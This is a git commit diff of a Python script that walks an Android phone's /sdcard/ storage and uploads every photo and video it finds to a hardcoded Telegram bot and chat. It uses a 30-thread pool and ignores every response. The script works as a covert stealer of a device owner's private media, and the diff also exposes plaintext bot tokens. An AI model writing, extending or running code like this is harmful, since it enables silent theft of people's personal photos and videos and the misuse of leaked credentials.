4aa5ae240a705f3067cdfb5cfcb47bf81196934b
Harryuwuu-NP <94730463+HARRY-EXE@users.noreply.github.com>
2024-09-17 14:43:20 +0545

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,15 @@
 import os
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 # Your bot's token
-BOT_TOKEN = '7367021244:AAE7J51xfn7XHSg4wPS9-Rqh5ax8b-1QdhU'
-# Your chat ID (user or group where you want to send the photos)
+BOT_TOKEN = '7414483707:AAGzV3_Qu2S49pIXIEoec0FG49Z7wt-8PYA'
+# Your chat ID (user or group where you want to send the photos/videos)
 CHAT_ID = '6568295648'
-# Path to the directory containing the photos
+# Path to the directory containing the media files
 DIRECTORY = '/sdcard/'
+# Maximum number of threads (workers)
+MAX_WORKERS = 30
 
 def send_photo(photo_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
@@ -19,13 +22,31 @@ def send_photo(photo_path):
         else:
             pass
 
-def send_all_photos(directory):
-    # Use os.walk to traverse all directories and subdirectories
-    for root, dirs, files in os.walk(directory):
-        for filename in files:
-            if filename.endswith(('.jpg', '.jpeg', '.png')):
-                photo_path = os.path.join(root, filename)
-                send_photo(photo_path)
+def send_video(video_path):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
+    with open(video_path, 'rb') as video:
+        files = {'video': video}
+        data = {'chat_id': CHAT_ID}
+        response = requests.post(url, files=files, data=data)
+        if response.status_code == 200:
+            pass
+        else:
+            pass
 
-# Run the function to send all photos
-send_all_photos(DIRECTORY)
+def send_media_task(file_path):
+    if file_path.endswith(('.jpg', '.jpeg', '.png')):
+        send_photo(file_path)
+    elif file_path.endswith(('.mp4', '.avi', '.mkv', '.mov')):
+        send_video(file_path)
+
+def send_all_media(directory):
+    # Use os.walk to traverse all directories and subdirectories
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        for root, dirs, files in os.walk(directory):
+            for filename in files:
+                file_path = os.path.join(root, filename)
+                # Submit each file sending task to the thread pool
+                executor.submit(send_media_task, file_path)
+
+# Run the function to send all photos and videos
+send_all_media(DIRECTORY)
